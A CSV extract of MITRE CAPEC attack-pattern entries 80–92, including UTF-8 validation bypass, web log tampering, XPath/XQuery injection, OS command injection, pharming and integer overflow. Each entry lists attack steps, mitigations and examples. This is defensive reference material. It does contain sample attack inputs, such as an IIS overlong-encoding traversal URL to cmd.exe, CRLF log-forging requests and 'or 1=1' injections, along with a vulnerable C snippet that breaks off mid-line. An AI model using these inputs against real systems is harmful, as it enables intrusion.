CAPEC-80,Using UTF-8 Encoding to Bypass Validation Logic,Detailed,Draft,"This attack is a specific variation on leveraging alternate encodings to bypass validation logic. This attack leverages the possibility to encode potentially harmful input in UTF-8 and submit it to applications not expecting or effective at validating this encoding standard making input filtering difficult. UTF-8 (8-bit UCS/Unicode Transformation Format) is a variable-length character encoding for Unicode. Legal UTF-8 characters are one to four bytes long. However, early version of the UTF-8 specification got some entries wrong (in some cases it permitted overlong characters). UTF-8 encoders are supposed to use the shortest possible encoding, but naive decoders may accept encodings that are longer than necessary. According to the RFC 3629, a particularly subtle form of this attack can be carried out against a parser which performs security-critical validity checks against the UTF-8 encoded form of its input, but interprets certain illegal octet sequences as characters.",N/A,High,High,::NATURE:PeerOf:CAPEC ID:64::NATURE:PeerOf:CAPEC ID:71::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the Explore phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Try to use UTF-8 encoding of content in Scripts in order to bypass validation routines.:TECHNIQUE:Try to use UTF-8 encoding of content in HTML in order to bypass validation routines.:TECHNIQUE:Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.::",::The application's UTF-8 decoder accepts and interprets illegal UTF-8 characters or non-shortest format of UTF-8 encoding.::Input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::,::SKILL:An attacker can inject different representation of a filtered character in UTF-8 format.:LEVEL:Low::SKILL:An attacker may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.:LEVEL:Medium::,N/A,"::A web page that contains overly long UTF-8 codes constitute a protocol anomaly, and could be an indication that an attacker is attempting to exploit a vulnerability on the target host.::An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.::An IDS filtering network traffic may be able to detect illegal UTF-8 characters.::",::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,"::The Unicode Consortium recognized multiple representations to be a problem and has revised the Unicode Standard to make multiple representations of the same code point with UTF-8 illegal. The UTF-8 Corrigendum lists the newly restricted UTF-8 range (See references). Many current applications may not have been revised to follow this rule. Verify that your application conform to the latest UTF-8 encoding specification. Pay extra attention to the filtering of illegal characters.::The exact response required from an UTF-8 decoder on invalid input is not uniformly defined by the standards. In general, there are several ways a UTF-8 decoder might behave in the event of an invalid byte sequence: 1. Insert a replacement character (e.g. '?', ''). 2. Ignore the bytes. 3. Interpret the bytes according to a different character encoding (often the ISO-8859-1 character map). 4. Not notice and decode as if the bytes were some similar bit of UTF-8. 5. Stop decoding and report an error (possibly giving the caller the option to continue). It is possible for a decoder to behave in different ways for different types of invalid input. RFC 3629 only requires that UTF-8 decoders must not decode overlong sequences (where a character is encoded in more bytes than needed but still adheres to the forms above). The Unicode Standard requires a Unicode-compliant decoder to ...treat any ill-formed code unit sequence as an error condition. This guarantees that it will neither interpret nor emit an ill-formed code unit sequence. Overlong forms are one of the most troublesome types of UTF-8 data. The current RFC says they must not be decoded but older specifications for UTF-8 only gave a warning and many simpler decoders will happily decode them. Overlong forms have been used to bypass security validations in high profile products including Microsoft's IIS web server. Therefore, great care must be taken to avoid security issues if validation is performed before conversion from UTF-8, and it is generally much simpler to handle overlong forms before any input validation is done. To maintain security in the case of invalid input, there are two options. The first is to decode the UTF-8 before doing any input validation checks. The second is to use a decoder that, in the event of invalid input, returns either an error or text that the application considers to be harmless. Another possibility is to avoid conversion out of UTF-8 altogether but this relies on any other software that the data is passed to safely handling the invalid data. Another consideration is error recovery. To guarantee correct recovery after corrupt or lost bytes, decoders must be able to recognize the difference between lead and trail bytes, rather than just assuming that bytes will be of the type allowed in their position.::For security reasons, a UTF-8 decoder must not accept UTF-8 sequences that are longer than necessary to encode a character. If you use a parser to decode the UTF-8 encoding, make sure that parser filter the invalid UTF-8 characters (invalid forms or overlong forms).::Look for overlong UTF-8 sequences starting with malicious pattern. You can also use a UTF-8 decoder stress test to test your UTF-8 parser (See Markus Kuhn's UTF-8 and Unicode FAQ in reference section)::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::","::Perhaps the most famous UTF-8 attack was against unpatched Microsoft Internet Information Server (IIS) 4 and IIS 5 servers. If an attacker made a request that looked like this http://servername/scripts/..%c0%af../winnt/system32/ cmd.exe the server didn't correctly handle %c0%af in the URL. What do you think %c0%af means? It's 11000000 10101111 in binary; and if it's broken up using the UTF-8 mapping rules, we get this: 11000000 10101111. Therefore, the character is 00000101111, or 0x2F, the slash (/) character! The %c0%af is an invalid UTF-8 representation of the / character. Such an invalid UTF-8 escape is often referred to as an overlong sequence. So when the attacker requested the tainted URL, they accessed http://servername/scripts/../../winnt/system32/cmd.exe In other words, they walked out of the script's virtual directory, which is marked to allow program execution, up to the root and down into the system32 directory, where they could pass commands to the command shell, Cmd.exe.See also: CVE-2000-0884::",::173::172::180::181::73::74::20::697::692::,N/A,N/A,https://capec.mitre.org/data/definitions/80.html
CAPEC-81,Web Logs Tampering,Detailed,Draft,"Web Logs Tampering attacks involve an attacker injecting, deleting or otherwise tampering with the contents of web logs typically for the purposes of masking other malicious behavior. Additionally, writing malicious data to log files may target jobs, filters, reports, and other agents that process the logs in an asynchronous attack pattern. This pattern of attack is similar to Log Injection-Tampering-Forging except that in this case, the attack is targeting the logs of the web server and not the application.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:268::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Application Web Server Log File Format] The attacker observes the system and looks for indicators of which logging utility is being used by the web server.TECHNIQUE:Determine logging utility being used by application web server (e.g. log4j), only possible if the application is known by the attacker or if the application returns error messages with logging utility information.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine Injectable Content] The attacker launches various logged actions with malicious data to determine what sort of log injection is possible.TECHNIQUE:Attacker triggers logged actions with maliciously crafted data as inputs, parameters, arguments, etc.::STEP:3:PHASE:Exploit:DESCRIPTION:[Manipulate Log Files] The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted request that the web server will receive and write into the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack.TECHNIQUE:Indirectly through injection, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: The HTTP request for /index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Directly through log file or database manipulation, use carriage return and/or line feed characters to start a new line in the log file, and then, add a fake entry. For example: The HTTP request for /index.html%0A%0DIP_ADDRESS- - DATE_FORMAT] GET /forged-path HTTP/1.1 200 - - USER_AGENT may add the log line into Apache access_log (for example). Different applications may require different encodings of the carriage return and line feed characters.:TECHNIQUE:Directly through log file or database manipulation, modify existing log entries.::",::Target server software must be a HTTP server that performs web logging.::,::SKILL:To input faked entries into Web logs:LEVEL:Low::,::Ability to send specially formatted HTTP request to web server::,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Design: Use input validation before writing to web log::Design: Validate all log data before it is output::,"::Most web servers have a public interface, even if the majority of the site is password protected, there is usually at least a login site and brochureware that is publicly available. HTTP requests to the site are also generally logged to a Web log. From an attacker point of view, standard HTTP requests containing a malicious payload can be sent to the public website (with no other access required), when those requests appear in the log (such as http://victimsite/index.html?< malicious script> if they are followed by an administrator this may be sufficient to probe the administrator's host or local network.::",::117::93::75::221::96::20::150::276::279::116::,N/A,N/A,https://capec.mitre.org/data/definitions/81.html
CAPEC-83,XPath Injection,Detailed,Draft,"An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that they normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:250::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an adversary records all instances of user-controllable input used to contruct XPath queries.TECHNIQUE:Use an automated tool to record all instances of user-controllable input used to contruct XPath queries.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes inputs.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine the tructure of queries] Using manual or automated means, test inputs found for XPath weaknesses.TECHNIQUE:Use an automated tool automatically probe the inputs for XPath weaknesses.:TECHNIQUE:Manually probe the inputs using characters such as single quote (') that can cause XPath-releated errors, thus indicating an XPath weakness.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject content into XPath query] Craft malicious content containing XPath expressions that is not validated by the application and is executed as part of the XPath queries.TECHNIQUE:Use the crafted input to execute unexpected queries that can disclose sensitive database information to the attacker.:TECHNIQUE:Use a combination of single quote (') and boolean expressions such as or 1=1 to manipulate XPath logic.:TECHNIQUE:Use XPath functions in the malicious content such as string-length, substring, or count to gain information about the XML document structure being used.::",::XPath queries used to retrieve information stored in XML documents::User-controllable input not properly sanitized before being used as part of XPath queries::,::SKILL:XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection:LEVEL:Low::,::None: No specialized resources are required to execute this type of attack.::,::Too many exceptions generated by the application as a result of malformed XPath queries::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XPath expression. Characters such as a single-quote(') or operators such as or (|), and (&) and such should be filtered if the application does not expect them in the context in which they appear. If such content cannot be filtered, it must at least be properly escaped to avoid them being interpreted as part of XPath expressions.::Use of parameterized XPath queries - Parameterization causes the input to be restricted to certain domains, such as strings or integers, and any input outside such domains is considered invalid and the query fails.::Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.::",::Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.::,::91::74::20::707::,TAXONOMY NAME:WASC:ENTRY ID:39:ENTRY NAME:XPath Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Blind XPath Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:XPATH Injection::,N/A,https://capec.mitre.org/data/definitions/83.html
CAPEC-84,XQuery Injection,Detailed,Draft,"This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:250::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use XML files to inject input.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:3:PHASE:Exploit:DESCRIPTION:[Information Disclosure] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.TECHNIQUE:Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.::STEP:4:PHASE:Exploit:DESCRIPTION:[Manipulate the data in the XML database] The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.TECHNIQUE:Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.::",::The XQL must execute unvalidated data::,::SKILL:Basic understanding of XQuery:LEVEL:Low::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,::Design: Perform input allowlist validation on all XML input::Implementation: Run xml parsing and query infrastructure with minimal privileges so that an attacker is limited in their ability to probe other system resources from XQL.::,"::An attacker can pass XQuery expressions embedded in otherwise standard XML documents. Like SQL injection attacks, the attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[Name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL.::",::74::707::,TAXONOMY NAME:WASC:ENTRY ID:46:ENTRY NAME:XQuery Injection::,N/A,https://capec.mitre.org/data/definitions/84.html
CAPEC-85,AJAX Footprinting,Detailed,Draft,"This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. A common first step for an attacker is to footprint the target environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on. The knowledge gained through Ajax fingerprinting can be used to support other attacks, such as XSS.",N/A,High,Low,::NATURE:ChildOf:CAPEC ID:580::NATURE:CanPrecede:CAPEC ID:63::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Send request to target webpage and analyze HTML] Using a browser or an automated tool, an adversary sends requests to a webpage and records the received HTML response. Adversaries then analyze the HTML to identify any known underlying JavaScript architectures. This can aid in mappiong publicly known vulnerabilities to the webpage and can also helpo the adversary guess application architecture and the inner workings of a system.TECHNIQUE:Record all src values inside script tags. These JavaScript files are compared to lists of files for known architectures. If there is a large match between the src values and architecture files, then it can be assumed that particular architecture is being used.::",::The user must allow JavaScript to execute in their browser::,::SKILL:To land and launch a script on victim's machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript:LEVEL:Medium::,::None: No specialized resources are required to execute this type of attack.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,::Design: Use browser technologies that do not allow client side scripting.::Implementation: Perform input validation for all remote content.::,"::Footprinting can be executed over almost any protocol including HTTP, TCP, UDP, and ICMP, with the general goal of gaining further information about a host environment to launch further attacks. The attacker can probe the system for banners, vulnerabilities, filenames, available services, and in short anything the host process has access to. The results of the probe are either used to execute javascript (for example, if the attackers' footprint script identifies a vulnerability in a firewall permission, then the client side script executes a javascript to change client firewall settings, or an attacker may simply echo the results of the scan back out to a remote host for targeting future attacks) or to inform other data gathering activities in order to craft atta.::",::79::113::348::96::20::116::184::86::692::,N/A,N/A,https://capec.mitre.org/data/definitions/85.html
CAPEC-87,Forceful Browsing,Standard,Draft,"An attacker employs forceful browsing (direct URL entry) to access portions of a website that are otherwise unreachable. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:115::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using an automated tool, an attacker follows all public links on a web site. They record all the links they find.TECHNIQUE:Use a spidering tool to follow and record all links.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt well-known or guessable resource locations] Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. They record all the positive responses from the server.TECHNIQUE:Use a spidering tool to follow and record attempts on well-known URLs.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use unauthorized resources] By visiting the unprotected resource, the attacker makes use of unauthorized functionality.TECHNIQUE:Access unprotected functions and execute them.::STEP:4:PHASE:Exploit:DESCRIPTION:[View unauthorized data] The attacker discovers and views unprotected sensitive data.TECHNIQUE:Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)::",::The forcibly browseable pages or accessible resources must be discoverable and improperly protected.::,::SKILL:Forcibly browseable pages can be discovered by using a number of automated tools. Doing the same manually is tedious but by no means difficult.:LEVEL:Low::,"::None: No specialized resources are required to execute this type of attack. A directory listing is helpful, but not a requirement.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::,"::Authenticate request to every resource. In addition, every page or resource must ensure that the request it is handling has been made in an authorized context.::Forceful browsing can also be made difficult to a large extent by not hard-coding names of application pages or resources. This way, the attacker cannot figure out, from the application alone, the resources available from the present context.::",::A bulletin board application provides an administrative interface at admin.aspx when the user logging in belongs to the administrators group. An attacker can access the admin.aspx interface by making a direct request to the page. Not having access to the interface appropriately protected allows the attacker to perform administrative functions without having to authenticate themself in that role.::,::425::285::693::,TAXONOMY NAME:WASC:ENTRY ID:34:ENTRY NAME:Predictable Resource Location::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Forced browsing::,N/A,https://capec.mitre.org/data/definitions/87.html
CAPEC-88,OS Command Injection,Standard,Draft,"In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:248::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify inputs for OS commands] The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.TECHNIQUE:Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.:TECHNIQUE:TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, they attempt to guess the actual operating system.:TECHNIQUE:Induce errors to find informative error messages::STEP:2:PHASE:Explore:DESCRIPTION:[Survey the Application] The attacker surveys the target application, possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Inventory all application inputs::STEP:3:PHASE:Experiment:DESCRIPTION:[Vary inputs, looking for malicious results.] Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the applicationTECHNIQUE:Inject command delimiters using network packet injection tools (netcat, nemesis, etc.):TECHNIQUE:Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)::STEP:4:PHASE:Exploit:DESCRIPTION:[Execute malicious commands] The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.TECHNIQUE:The attacker executes a command that stores sensitive information into a location where they can retrieve it later (perhaps using a different command injection).::",::User controllable input used as part of commands to the underlying operating system.::,"::SKILL:The attacker needs to have knowledge of not only the application to exploit but also the exact nature of commands that pertain to the target operating system. This may involve, though not always, knowledge of specific assembly commands for the platform.:LEVEL:High::",N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Use language APIs rather than relying on passing data to the operating system shell or command line. Doing so ensures that the available protection mechanisms in the language are intact and applicable.::Filter all incoming data to escape or remove characters or strings that can be potentially misinterpreted as operating system or shell commands::All application processes should be run with the minimal privileges required. Also, processes must shed privileges as soon as they no longer require them.::","::A transaction processing system relies on code written in a number of languages. To access this functionality, the system passes transaction information on the system command line. An attacker can gain access to the system command line and execute malicious commands by injecting these commands in the transaction data. If successful, the attacker can steal information, install backdoors and perform other nefarious activities that can compromise the system and its data.See also: A vulnerability in Mozilla Firefox 1.x browser allows an attacker to execute arbitrary commands on the UNIX/Linux operating system. The vulnerability is caused due to the shell script used to launch Firefox parsing shell commands that are enclosed within back-ticks in the URL provided via the command line. This can be exploited to execute arbitrary shell commands by tricking a user into following a malicious link in an external application which uses Firefox as the default browser (e.g. the mail client Evolution on Red Hat Enterprise Linux 4).::",::78::88::20::697::,TAXONOMY NAME:WASC:ENTRY ID:31:ENTRY NAME:OS Commanding::,N/A,https://capec.mitre.org/data/definitions/88.html
CAPEC-89,Pharming,Standard,Draft,"A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to their site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:151::,"::STEP:1:PHASE:Exploit:DESCRIPTION:Attacker sets up a system mocking the one trusted by the users. This is usually a website that requires or handles sensitive information.::STEP:2:PHASE:Exploit:DESCRIPTION:The attacker then poisons the resolver for the targeted site. This is achieved by poisoning the DNS server, or the local hosts file, that directs the user to the original website::STEP:3:PHASE:Exploit:DESCRIPTION:When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one.::STEP:4:PHASE:Exploit:DESCRIPTION:Because of the identical nature of the original site and the attacker controlled one, and the fact that the URL is still the original one, the victim trusts the website reached and the attacker can now farm sensitive information such as credentials or account numbers.::",::Vulnerable DNS software or improperly protected hosts file or router that can be poisoned::A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming::,"::SKILL:The attacker needs to be able to poison the resolver - DNS entries or local hosts file or router entry pointing to a trusted DNS server - in order to successfully carry out a pharming attack. Setting up a fake website, identical to the targeted one, does not require special skills.:LEVEL:Medium::","::None: No specialized resources are required to execute this type of attack. Having knowledge of the way the target site has been structured, in order to create a fake version, is required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::All sensitive information must be handled over a secure connection.::Known vulnerabilities in DNS or router software or in operating systems must be patched as soon as a fix has been released and tested.::End users must ensure that they provide sensitive information only to websites that they trust, over a secure connection with a valid certificate issued by a well-known certificate authority.::","::An online bank website requires users to provide their customer ID and password to log on, but does not use a secure connection. An attacker can setup a similar fake site and leverage pharming to collect this information from unknowing victims.::",::346::350::,N/A,N/A,https://capec.mitre.org/data/definitions/89.html
CAPEC-9,Buffer Overflow in Local Command-Line Utilities,Detailed,Draft,This attack targets command-line utilities available in a number of shells. An adversary can leverage a vulnerability found in a command-line utility to escalate privilege to root.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:100::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target system] The adversary first finds a target system that they want to gain elevated priveleges on. This could be a system they already have some level of access to or a system that they will gain unauthorized access at a lower privelege using some other means.::STEP:2:PHASE:Explore:DESCRIPTION:[Find injection vector] The adversary identifies command line utilities exposed by the target host that contain buffer overflow vulnerabilites. The adversary likely knows which utilities have these vulnerabilities and what the effected versions are, so they will also obtain version numbers for these utilities.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow command] Once the adversary has found a vulnerable utility, they will use their knownledge of the vulnerabilty to create the command that will exploit the buffer overflow.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary executes the crafted command, gaining elevated priveleges on the machine.::",::The target host exposes a command-line utility to the user.::The command-line utility exposed by the target host has a buffer overflow vulnerability that can be exploited.::,::SKILL:An adversary can simply overflow a buffer by inserting a long string into an adversary-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::,"::Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as buffer overflow.::Use a language or compiler that performs automatic bounds checking.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Apply the latest patches to your user exposed services. This may not be a complete solution, especially against a zero day attack.::Do not unnecessarily expose services.::",::Attack Example: HPUX passwd A buffer overflow in the HPUX passwd command allows local users to gain root privileges via a command-line option. Attack Example: Solaris getopt A buffer overflow in Solaris's getopt command (found in libc) allows local users to gain root privileges via a long argv[0].::,::120::118::119::74::20::680::733::697::,N/A,N/A,https://capec.mitre.org/data/definitions/9.html
CAPEC-92,Forced Integer Overflow,Detailed,Draft,"This attack forces an integer variable to go out of range. The integer variable is often used as an offset such as size of memory allocation or similarly. The attacker would typically control the value of such variable and try to get it out of range. For instance the integer in question is incremented past the maximum possible value, it may wrap to become a very small, or negative number, therefore providing a very incorrect value which can lead to unexpected behavior. At worst the attacker can execute arbitrary code.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:128::,::STEP:1:PHASE:Explore:DESCRIPTION:The first step is exploratory meaning the attacker looks for an integer variable that they can control.::STEP:2:PHASE:Experiment:DESCRIPTION:The attacker finds an integer variable that they can write into or manipulate and try to get the value of the integer out of the possible range.::STEP:3:PHASE:Exploit:DESCRIPTION:The integer variable is forced to have a value out of range which set its final value to an unexpected value.::STEP:4:PHASE:Exploit:DESCRIPTION:The target host acts on the data and unexpected behavior may happen.::,"::The attacker can manipulate the value of an integer variable utilized by the target host.::The target host does not do proper range checking on the variable before utilizing it.::When the integer variable is incremented or decremented to an out of range value, it gets a very different value (e.g. very small or negative number)::",::SKILL:An attacker can simply overflow an integer by inserting an out of range value.:LEVEL:Low::SKILL:Exploiting a buffer overflow by injecting malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,::Use a language or compiler that performs automatic bounds checking.::Carefully review the service's implementation before making it available to user. For instance you can use manual or automated code review to uncover vulnerabilities such as integer overflow.::Use an abstraction library to abstract away risky APIs. Not a complete solution.::Always do bound checking before consuming user input data.::,"::Integer overflow in the ProcAuWriteElement function in server/dia/audispatch.c in Network Audio System (NAS) before 1.8a SVN 237 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a large max_samples value. See also: CVE-2007-1544::The following code illustrates an integer overflow. The declaration of total integer as unsigned short int assumes that the length of the first and second arguments fits in such an integer. include <stdlib.h>include <string.h>include <stdio.h> int main (int argc, char *const *argv){if (argc !=3){printf(Usage: prog_name <string1> <string2>n);exit(-1); }unsigned short int total;total = strlen(argv[1])+strlen(argv[2])+1;char * buff = (char 